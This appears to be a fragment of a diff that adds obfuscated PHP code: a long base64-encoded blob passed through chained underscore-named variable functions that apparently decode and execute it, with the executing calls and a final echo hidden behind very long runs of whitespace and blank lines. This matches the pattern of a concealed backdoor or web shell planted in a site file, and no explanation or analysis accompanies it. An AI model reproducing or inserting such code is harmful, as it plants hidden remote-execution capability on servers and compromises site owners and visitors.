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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
